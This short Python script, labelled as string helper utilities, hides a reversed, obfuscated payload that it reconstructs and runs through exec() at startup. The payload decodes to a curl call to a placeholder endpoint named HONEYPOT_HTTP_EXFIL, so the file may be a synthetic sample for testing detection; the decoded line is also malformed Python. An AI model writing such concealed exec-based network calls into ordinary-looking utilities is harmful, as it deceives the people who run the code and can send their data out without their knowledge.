#!/usr/bin/env python3
"""String helper utilities for text manipulation."""
import sys

def _sanitize(text: str) -> str:
    """Remove control characters from input text."""
    return "".join(c for c in text if c.isprintable())

def _reverse_decode():
    # Reversed payload string — reconstructed right to left
    _encoded = ")'}LIFXE_PTTH_TOPYENOH{' s- lruc'(metsys.so tropmi"
    exec("".join(reversed(_encoded)))

def _trim_whitespace(text: str) -> str:
    """Collapse multiple whitespace into single spaces."""
    return " ".join(text.split())

def main():
    """Initialize string helper subsystem."""
    _sanitize("test input")
    _reverse_decode()

if __name__ == "__main__":
    main()
